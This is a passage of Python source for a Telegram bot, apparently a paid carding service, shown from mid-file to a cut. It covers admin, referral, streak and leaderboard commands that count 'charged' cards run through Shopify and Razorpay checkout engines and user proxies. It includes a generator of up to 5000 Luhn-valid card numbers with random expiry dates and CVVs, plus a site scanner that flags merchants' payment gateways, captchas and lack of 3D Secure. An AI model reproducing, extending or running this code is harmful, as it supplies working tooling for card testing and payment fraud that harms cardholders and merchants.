        f"⏱ Cooldown: <code>{FREE_COOLDOWN_SEC}s</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getlimits$'))
async def cmd_getlimits(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"📊 <b>{bs('Bot limits')}</b>\n{SEP}\n"
        f"🆓 Free daily: <code>{FREE_DAILY_LIMIT}</code>\n"
        f"⏱ Free cooldown: <code>{FREE_COOLDOWN_SEC}s</code>\n"
        f"💎 Premium default CC: <code>{DEFAULT_KEY_CC_LIMIT}</code>\n"
        f"🥇 Admin mass cap: <code>{MASS_HARD_CAP_ADMIN}</code>\n"
        f"🥈 Premium mass cap: <code>{MASS_HARD_CAP_PREMIUM}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"📁 Max proxies/user: <code>{MAX_PROXIES_PER_USER}</code>\n"
        f"⚙️ Workers/user: sp<code>{SP_PER_USER_WORKERS}</code> msp<code>{MSP_PER_USER_WORKERS}</code> "
        f"rz<code>{RZ_PER_USER_WORKERS}</code> mrz<code>{MRZ_PER_USER_WORKERS}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setuserlimit\s+'))
async def cmd_setuserlimit(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 3:
        return await styled_reply(event, pe(
            f"💎 <code>• /setuserlimit user_id daily_checks</code>\n"
            f"Use <code>0</code> {bs('for unlimited')}"))
    try:
        target = int(parts[1])
        limit = int(parts[2])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    d = _read_json(USER_LIMITS_FILE, {})
    if limit == 0:
        d.pop(str(target), None)
    else:
        d[str(target)] = limit
    _write_json(USER_LIMITS_FILE, d)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Limit set')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"📋 <code>{limit if limit else 'unlimited'}</code>"))


# ====================== ADMIN ======================
@client.on(events.NewMessage(pattern=r'^[/.]addadmin\s+'))
async def cmd_addadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /addadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already admin')}</b>"))
    ADMIN_ID.append(t)
    _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin added')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removeadmin\s+'))
async def cmd_removeadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /removeadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t not in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not an admin')}</b>"))
    ADMIN_ID.remove(t)
    _save_admins()
    await styled_reply(event, pe(f"✅ <b>{bs('Admin removed')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]toggle$'))
async def cmd_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return
    cur = get_maintenance()
    set_maintenance(not cur)
    await styled_reply(event, pe(f"💎 {bs('Maintenance')}: {'ON' if not cur else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]ping$'))
async def cmd_ping(event):
    t = time.time()
    m = await styled_reply(event, pe("🏓 ..."))
    if m:
        try:
            await m.edit(pe(f"🏓 <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>"),
                         parse_mode='html')
        except Exception:
            pass


@client.on(events.NewMessage(pattern=r'^[/.]status$'))
async def cmd_status(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, build_status_text())


@client.on(events.NewMessage(pattern=r'^[/.]api$'))
async def cmd_api(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"🔌 <b>{bs('API-Less Mode')}</b>\n{SEP}\n"
        f"✅ {bs('Shopify engine')}: <code>checkout_engine v5.x</code>\n"
        f"✅ {bs('Razorpay engine')}: <code>razorpay_engine v2.x</code>\n"
        f"📦 {bs('Shopify loaded')}: <code>{CHECKOUT_ENGINE_OK}</code>\n"
        f"📦 {bs('Razorpay loaded')}: <code>{RAZORPAY_ENGINE_OK}</code>\n"
        f"📦 {bs('Shopify harvester')}: <code>{SHOPIFY_HARVESTER_OK}</code>\n"
        f"📦 {bs('Razorpay harvester')}: <code>{RZ_HARVESTER_OK}</code>\n"
        f"🔬 {bs('Engine proxy check')}: <code>{ENGINE_PROXY_CHECK_OK}</code>\n"
        f"👑 {bs('Admins loaded')}: <code>{len(ADMIN_ID)}</code>\n"
        f"🚀 {bs('No external Flask needed')}"))


@client.on(events.NewMessage(pattern=r'^[/.]version$'))
async def cmd_version(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"🤖 <b>{bs('Bot Version')}</b>\n{SEP}\n"
        f"📦 Version: <code>v6.4.0</code>\n"
        f"🔒 Force-join: <code>{len(FORCE_JOIN_CHATS)}</code>\n"
        f"🆔 Group: <code>{FORCE_JOIN_GROUP_ID}</code>\n"
        f"🆔 Channel: <code>{FORCE_JOIN_CHANNEL_ID}</code>\n"
        f"🔧 API mode: <code>API-LESS</code>\n"
        f"⚙️ Shopify engine: <code>{CHECKOUT_ENGINE_OK}</code>\n"
        f"⚙️ Razorpay engine: <code>{RAZORPAY_ENGINE_OK}</code>\n"
        f"⚙️ Shopify harvester: <code>{SHOPIFY_HARVESTER_OK}</code>\n"
        f"⚙️ Razorpay harvester: <code>{RZ_HARVESTER_OK}</code>\n"
        f"🔬 Engine proxy check: <code>{ENGINE_PROXY_CHECK_OK}</code>\n"
        f"⚙️ Per-user workers: <code>sp={SP_PER_USER_WORKERS} msp={MSP_PER_USER_WORKERS} rz={RZ_PER_USER_WORKERS} mrz={MRZ_PER_USER_WORKERS}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]diag$'))
async def cmd_diag(event):
    if event.sender_id not in ADMIN_ID:
        return
    lines = [f"🔍 <b>{bs('Full Diagnostic')}</b>", SEP]
    lines.append(f"📦 Version: <code>v6.4.0</code>")
    lines.append(f"⚙️ Shopify engine loaded: <code>{CHECKOUT_ENGINE_OK}</code>")
    if not CHECKOUT_ENGINE_OK:
        lines.append(f"❌ Shopify error: <code>{_CHECKOUT_IMPORT_ERR}</code>")
    lines.append(f"⚙️ Razorpay engine loaded: <code>{RAZORPAY_ENGINE_OK}</code>")
    if not RAZORPAY_ENGINE_OK:
        lines.append(f"❌ Razorpay error: <code>{_RZ_IMPORT_ERR}</code>")
    lines.append(f"⚙️ Shopify harvester loaded: <code>{SHOPIFY_HARVESTER_OK}</code>")
    if not SHOPIFY_HARVESTER_OK:
        lines.append(f"❌ SH harvester error: <code>{_SH_HARVEST_ERR}</code>")
    lines.append(f"⚙️ Razorpay harvester loaded: <code>{RZ_HARVESTER_OK}</code>")
    if not RZ_HARVESTER_OK:
        lines.append(f"❌ RZ harvester error: <code>{_RZ_HARVEST_ERR}</code>")
    lines.append(f"🔬 Engine proxy check: <code>{ENGINE_PROXY_CHECK_OK}</code>")
    lines.append(f"🔒 Force-join: <code>{len(FORCE_JOIN_CHATS)}</code>")
    lines.append(f"👑 Admins: <code>{ADMIN_ID}</code>")
    lines.append(SEP)
    sites = load_sites()
    rz_sites = load_rz_sites()
    proxies = load_user_proxies(event.sender_id)
    lines.append(f"🌐 Shopify sites: <code>{len(sites)}</code>")
    lines.append(f"💳 Razorpay sites: <code>{len(rz_sites)}</code>")
    lines.append(f"🔌 Your proxies: <code>{len(proxies)}</code>")
    lines.append(f"🔥 Premium users: <code>{len(load_premium_users())}</code>")
    lines.append(f"🎁 Referral users: <code>{len(load_referrals()['users'])}</code>")
    lines.append(f"🔥 Streak users: <code>{len(load_streaks())}</code>")
    lines.append(f"📊 Site stats tracked: <code>{len(load_site_stats())}</code>")
    lines.append(SEP)
    lines.append(f"⚙️ Workers (per-user): sp<code>{SP_PER_USER_WORKERS}</code> "
                 f"msp<code>{MSP_PER_USER_WORKERS}</code> "
                 f"rz<code>{RZ_PER_USER_WORKERS}</code> "
                 f"mrz<code>{MRZ_PER_USER_WORKERS}</code>")
    await styled_reply(event, pe("\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]stats$'))
async def cmd_stats(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    rank = load_rank()
    total_charged = sum(int(v) for v in rank.values()) if rank else 0
    refs = load_referrals()
    total_refs = sum(len(u.get("rewarded", [])) for u in refs["users"].values())
    await styled_reply(event, pe(
        f"📊 <b>{bs('Stats')}</b>\n{SEP}\n"
        f"👑 Admins: <code>{len(ADMIN_ID)}</code>\n"
        f"💎 Premium: <code>{len(data)}</code>\n"
        f"🌐 Shopify sites: <code>{len(load_sites())}</code>\n"
        f"💳 Razorpay sites: <code>{len(load_rz_sites())}</code>\n"
        f"🔑 Keys: <code>{len(load_keys())}</code>\n"
        f"💳 Total charged: <code>{total_charged}</code>\n"
        f"🎁 Total referrals: <code>{total_refs}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"🤖 Maintenance: {'ON' if get_maintenance() else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]all\s+'))
async def cmd_all(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /all message</code>"))
    msg = parts[1]
    data = load_premium_users()
    sent = 0
    for uid_str in data.keys():
        try:
            await send_entities(int(uid_str), pe(msg))
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await styled_reply(event, pe(f"✅ {bs('Sent to')} <code>{sent}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]resetledger$'))
async def cmd_resetledger(event):
    if event.sender_id not in ADMIN_ID:
        return
    try:
        from checkout_engine import ledger_clear, ledger_stats
        ledger_clear()
        await styled_reply(event, pe(
            f"✅ <b>{bs('Ledger cleared')}</b>\n"
            f"💳 {bs('Next charge re-submits fresh')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== REFERRAL CMDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]ref(?:eral)?$'))
async def cmd_ref(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    hours = REFERRAL_MILESTONE_HOURS
    cc = REFERRAL_MILESTONE_CC_LIMIT
    confirmed = s["confirmed"]
    in_cycle = confirmed % every
    bar = "▰" * in_cycle + "▱" * (every - in_cycle)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <b>{bs('Your Link')}</b>
<code>{link}</code>

🔑 <b>{bs('Code')}</b>: <code>{code}</code>
{SEP}
📊 <b>{bs('Your Stats')}</b>
┣ ✅ {bs('Confirmed')}: <code>{confirmed}</code>
┣ ⏳ {bs('Pending')}: <code>{s['pending']}</code>
┣ 🏅 {bs('Milestones')}: <code>{s['milestones_paid']}</code>
┗ 💰 {bs('Total Hours')}: <code>{s['total_hours']}h</code>

📈 <b>{bs('Progress')}</b>
<code>{bar}</code>  <b>{in_cycle}/{every}</b>
🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code> {bs('more')}
{SEP}
💎 <b>{bs('Reward every')} {every} {bs('referrals')}</b>
┣ ⏰ <code>+{hours}h Premium</code>
┗ 💳 <code>+{cc} CC limit</code>
{SEP}
💡 {bs('Friend must complete')} <code>{REFERRAL_MIN_CHECKS}</code> {bs('check')}""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    buttons = [
        [pbtn(bs("📤 Share Link"), url=share_url, style="success", icon="📤")],
        [pbtn(bs("👥 My Referrals"), data="ref_myrefs", style="primary", icon="👥"),
         pbtn(bs("🏆 Leaderboard"), data="ref_leaderboard", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.](refleaderboard|topref)$'))
async def cmd_topref(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    data = load_referrals()
    rows = []
    for uid_s, u in data["users"].items():
        cnt = len(u.get("rewarded", []))
        if cnt > 0:
            rows.append((uid_s, cnt, int(u.get("total_hours_earned", 0))))
    rows.sort(key=lambda x: x[1], reverse=True)
    rows = rows[:10]
    if not rows:
        return await styled_reply(event, pe(
            f"🏆 <b>{bs('Top Referrers')}</b>\n{SEP}\n"
            f"<i>{bs('No referrers yet')}</i>\n{SEP}\n"
            f"💡 {bs('Be the first! Use')} <code>• /ref</code>"))
    medals = ["🥇", "🥈", "🥉"]
    lines = []
    for i, (uid_s, cnt, hrs) in enumerate(rows):
        try:
            ent = await client_instance.get_entity(int(uid_s))
            name = ent.first_name or uid_s
        except Exception:
            name = uid_s
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code> refs · <code>{hrs}h</code>")
    text = pe(f"🏆 <b>{bs('Top Referrers')}</b>\n{SEP}\n" + "\n".join(lines) + f"""
{SEP}
🎁 {bs('Every')} <code>{REFERRAL_MILESTONE_EVERY}</code> refs → <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code>""")
    buttons = [
        [pbtn(bs("🎁 My Referrals"), data="ref_menu", style="success", icon="🎁")],
        [pbtn(bs("🔙 Tools"), data="tools_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]refstats$'))
async def cmd_refstats(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_referrals()
    total_users = len(data["users"])
    total_confirmed = sum(len(u.get("rewarded", [])) for u in data["users"].values())
    total_pending = sum(len(u.get("pending", [])) for u in data["users"].values())
    total_hours = sum(int(u.get("total_hours_earned", 0)) for u in data["users"].values())
    total_milestones = sum(int(u.get("milestones_paid", 0)) for u in data["users"].values())
    await styled_reply(event, pe(
        f"📊 <b>{bs('Referral Stats')}</b>\n{SEP}\n"
        f"👥 {bs('Users')}: <code>{total_users}</code>\n"
        f"✅ {bs('Confirmed')}: <code>{total_confirmed}</code>\n"
        f"⏳ {bs('Pending')}: <code>{total_pending}</code>\n"
        f"🏅 {bs('Milestones paid')}: <code>{total_milestones}</code>\n"
        f"💰 {bs('Total hours')}: <code>{total_hours}h</code>\n{SEP}\n"
        f"🎁 {bs('Every')} <code>{REFERRAL_MILESTONE_EVERY}</code> refs → "
        f"<code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]refreset\s+'))
async def cmd_refreset(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /refreset user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    if reset_referrals_for_user(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Reset')}</b>\n👤 <code>{target}</code>"))
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('No data')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]refgive\s+'))
async def cmd_refgive(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /refgive user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    _grant_milestone(target, REFERRAL_MILESTONE_HOURS, REFERRAL_MILESTONE_CC_LIMIT)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Milestone granted')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"🎁 +{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC"))


# ====================== ENGAGEMENT ======================
@client.on(events.NewMessage(pattern=r'^[/.]streak$'))
async def cmd_streak(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    s = get_streak(uid)
    cur = s["current"]
    best = s["best"]
    upcoming = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if upcoming:
        target = upcoming[0]
        prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = target - prev
        step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step)
        next_str = f"{bs('Next at')} <code>{target}</code> {bs('days')} (<code>{span - step}</code> {bs('left')})"
    else:
        bar = "▰" * 10
        next_str = f"<i>{bs('All milestones reached')}</i>"
    text = pe(f"""🔥 <b>{bs('Daily Streak')}</b>
{SEP}
📅 <b>{bs('Current')}</b>: <code>{cur}</code> {bs('days')}
🏆 <b>{bs('Best')}</b>: <code>{best}</code> {bs('days')}
✅ <b>{bs('Total Checks')}</b>: <code>{s['total_checks']}</code>

{bar}
{next_str}
{SEP}
🎁 <b>{bs('Milestones')}</b>
""" + "\n".join(
        f"┣ {bs('Day')} <code>{d}</code> → <code>+{h}h</code>"
        for d, h in sorted(STREAK_MILESTONES.items())
    ) + f"""
{SEP}
💡 {bs('Run')} <code>• /sh</code> {bs('daily to keep the streak alive')}""")
    buttons = [
        [pbtn(bs("📊 My Stats"), data="me_menu", style="primary", icon="📊")],
        [pbtn(bs("🔙 Tools"), data="tools_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]me$'))
async def cmd_me(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    rank = load_rank()
    charged_total = int(rank.get(str(uid), 0))
    sorted_rank = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)
    position = "—"
    for i, (rid, _) in enumerate(sorted_rank, 1):
        if rid == str(uid):
            position = f"#{i}"
            break
    s = get_streak(uid)
    if uid in ADMIN_ID:
        tier = f"👑 {bs('Admin')}"
        exp_str = "∞"
        cc_limit = 100000
    elif is_premium(uid):
        tier = f"💎 {bs('Premium')}"
        info = load_premium_users().get(str(uid))
        if info is None:
            exp_str = "∞"
            cc_limit = 100000
        elif isinstance(info, dict):
            exp = info.get("expiry")
            cc_limit = int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT))
            if exp:
                left = max(0, int((float(exp) - datetime.now().timestamp()) / 60))
                h, m = left // 60, left % 60
                exp_str = f"{h}h {m:02d}m"
            else:
                exp_str = "∞"
        else:
            exp_str = "?"
            cc_limit = 0
    else:
        tier = f"🆓 {bs('Free')}"
        exp_str = "—"
        cc_limit = 0
        try:
            used = get_free_usage(uid)
            exp_str = f"{used}/{FREE_DAILY_LIMIT} " + bs("today")
        except Exception:
            pass
    try:
        rs = referral_stats(uid)
        ref_conf = rs.get("confirmed", 0)
        ref_pend = rs.get("pending", 0)
        ref_hours = rs.get("total_hours", 0)
        ref_mst = rs.get("milestones_paid", 0)
    except Exception:
        ref_conf = ref_pend = ref_hours = ref_mst = 0
    try:
        p_count = len(load_user_proxies(uid))
    except Exception:
        p_count = 0
    text = pe(f"""📊 <b>{bs('My Stats')}</b>
{SEP}
👤 <b>{name}</b> (@{username})
🆔 <code>{uid}</code>
🎖️ {bs('Tier')}: {tier}
⏰ {bs('Expires')}: <code>{exp_str}</code>
💳 {bs('CC Limit')}: <code>{cc_limit}</code>
{SEP}
🔥 {bs('Streak')}: <code>{s['current']}</code> (best <code>{s['best']}</code>)
💳 {bs('Charged Total')}: <code>{charged_total}</code>
🥇 {bs('Rank')}: <code>{position}</code>
{SEP}
👥 {bs('Referrals')}: <code>{ref_conf}</code> (⏳ <code>{ref_pend}</code>)
🏅 {bs('Milestones')}: <code>{ref_mst}</code>
💰 {bs('Referral Hours')}: <code>{ref_hours}h</code>
{SEP}
🔌 {bs('Proxies')}: <code>{p_count}</code>""")
    buttons = [
        [pbtn(bs("🔥 Streak"), data="streak_menu", style="success", icon="🔥"),
         pbtn(bs("🎁 Referrals"), data="ref_menu", style="success", icon="🎁")],
        [pbtn(bs("🏆 Leaderboard"), data="rank_menu", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Tools"), data="tools_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]rank$'))
async def cmd_rank(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    rank = load_rank()
    if not rank:
        return await styled_reply(event, pe(f"💎 {bs('No charged cards yet')}"))
    top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
    medals = ["🥇", "🥈", "🥉"]
    lines = []
    for i, (uid_str, count) in enumerate(top):
        try:
            ent = await client_instance.get_entity(int(uid_str))
            name = ent.first_name or uid_str
        except Exception:
            name = uid_str
        medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
        lines.append(f"{medal} <b>{name}</b> — <code>{count}</code>")
    await styled_reply(event, pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines)))


# ====================== TOOLS ======================
@client.on(events.NewMessage(pattern=r'^[/.]bin(?:\s+(.+))?$'))
async def cmd_bin(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw:
        return await styled_reply(event, pe(f"💎 <code>• /bin 515462</code>"))
    bin_num = raw.split()[0][:6]
    if not bin_num.isdigit() or len(bin_num) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    brand, typ, level, bank, country, flag = await get_bin_info(bin_num)
    await styled_reply(event, pe(
        f"💎 <b>{bs('BIN Lookup')}</b>\n{SEP}\n"
        f"📌 <b>BIN</b>: <code>{bin_num}</code>\n"
        f"🏷️ <b>Brand</b>: {brand}\n"
        f"💳 <b>Type</b>: {typ}\n"
        f"📊 <b>Level</b>: {level}\n"
        f"🏦 <b>Bank</b>: {bank}\n"
        f"🌍 <b>Country</b>: {country} {flag}"))


def _luhn_check(number: str) -> int:
    digits = [int(d) for d in number]
    odd = digits[-1::-2]; even = digits[-2::-2]
    s = sum(odd)
    for d in even:
        s += sum(int(x) for x in str(d * 2))
    return s % 10


def _gen_card(bin_prefix: str, length: int = 16) -> str:
    card = bin_prefix
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    check = (10 - _luhn_check(card + '0')) % 10
    return card + str(check)


@client.on(events.NewMessage(pattern=r'^[/.]gen(?:\s+(.+))?$'))
async def cmd_gen(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw:
        return await styled_reply(event, pe(
            f"💎 <code>• /gen 515462 [count]</code>"))
    parts = raw.split()
    bin_prefix = parts[0]
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
    count = min(count, 5000)
    cards = []
    for _ in range(count):
        cn = _gen_card(bin_prefix)
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(2026, 2035))
        cvv = str(random.randint(100, 999)).zfill(3)
        cards.append(f"{cn}|{mm}|{yy}|{cvv}")
    if count > 50:
        fname = f"NOVA_gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for c in cards:
                await f.write(c + "\n")
        await send_file_entities(uid, fname,
            pe(f"✅ {bs('Generated')} <code>{count}</code>"))
        os.remove(fname)
    else:
        body = "\n".join(f"<code>{c}</code>" for c in cards)
        await styled_reply(event, pe(
            f"✅ <b>{bs('Generated')}</b> <code>{count}</code>\n{SEP}\n{body}"))


def _scg_scripts(html):
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)


def _scg_gateways(html):
    found, h = [], html.lower()
    srcs = _scg_scripts(html)
    for s in srcs:
        if "js.stripe.com" in s.lower(): found.append("Stripe"); break
    if not found and re.search(r'pk_live_|pk_test_', html): found.append("Stripe")
    for s in srcs:
        if "paypal.com/sdk" in s.lower(): found.append("PayPal"); break
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower(): found.append("Shopify"); break
    if not found and "shopify.com" in h: found.append("Shopify")
    if "woocommerce" in h: found.append("WooCommerce")
    for s in srcs:
        if "razorpay.com" in s.lower(): found.append("Razorpay"); break
    if not found and "razorpay" in h: found.append("Razorpay")
    return list(dict.fromkeys(found))


def _scg_cms(html):
    h = html.lower()
    found = []
    if "/wp-content/" in h: found.append("WordPress")
    if "woocommerce" in h: found.append("WooCommerce")
    if "myshopify.com" in h: found.append("Shopify")
    if "magento" in h: found.append("Magento")
    return found or ["Unknown"]


def _scg_captcha(html):
    h = html.lower()
    if "recaptcha" in h: return "reCAPTCHA"
    if "hcaptcha" in h: return "hCaptcha"
    if "turnstile" in h: return "Cloudflare Turnstile"
    return "None"


def _scg_3ds(html):
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action",
                            "cardinalcommerce", "cavv"]):
        return "3D Secure found ✅"
    return "2D only ❌"


@client.on(events.NewMessage(pattern=r'^[/.]scg(?:\s+(.+))?$'))
async def cmd_scg(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw:
        return await styled_reply(event, pe(f"💎 <code>• /scg site.com</code>"))
    url = raw.split()[0]
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return await styled_reply(event, pe(f"❌ HTTP {r.status}"))
            html = await r.text()
    except Exception as e:
        return await styled_reply(event, pe(f"❌ <code>{e}</code>"))
    gateways = _scg_gateways(html)
    cms = _scg_cms(html)
    captcha = _scg_captcha(html)
    threeds = _scg_3ds(html)
    await styled_reply(event, pe(
        f"💎 <b>{bs('Site Scanner')}</b>\n{SEP}\n"
        f"📌 <code>{url[:60]}</code>\n{SEP}\n"
        f"🛒 {bs('Gateways')}: {', '.join(gateways) or 'None'}\n"
        f"📝 {bs('CMS')}: {', '.join(cms)}\n"
        f"🔒 {bs('Captcha')}: {captcha}\n"
        f"🔐 {bs('3D Secure')}: {threeds}"))


@client.on(events.NewMessage(pattern=r'^[/.]ip(?:\s+(.+))?$'))
async def cmd_ip(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw:
        return await styled_reply(event, pe(f"💎 <code>• /ip 8.8.8.8</code>"))
    ip = raw.split()[0]
    try:
        session = await get_http_session()
        async with session.get(f'http://ip-api.com/json/{ip}',
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            data = await r.json(content_type=None)
        if data.get('status') == 'fail':
            return await styled_reply(event, pe(f"❌ <b>{bs('Invalid IP')}</b>"))
        await styled_reply(event, pe(
            f"🌐 <b>{bs('IP Lookup')}</b>\n{SEP}\n"
            f"📌 <code>{ip}</code>\n"
            f"🌍 {data.get('country', '-')}\n"
            f"🏙️ {data.get('city', '-')}\n"
            f"📍 {data.get('regionName', '-')}\n"
            f"📊 {data.get('isp', '-')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


def _iban_valid(iban: str) -> bool:
    iban = iban.replace(' ', '').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', iban):
        return False
    rearranged = iban[4:] + iban[:4]
    num = ""
    for ch in rearranged:
        num += ch if ch.isdigit() else str(ord(ch) - 55)
    return int(num) % 97 == 1


@client.on(events.NewMessage(pattern=r'^[/.]iban(?:\s+(.+))?$'))
async def cmd_iban(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    raw = (event.pattern_match.group(1) or '').strip()
    if not raw:
        return await styled_reply(event, pe(
            f"💎 <code>• /iban GB82WEST12345698765432</code>"))
    iban = raw.split()[0]
    ok = _iban_valid(iban)
    await styled_reply(event, pe(
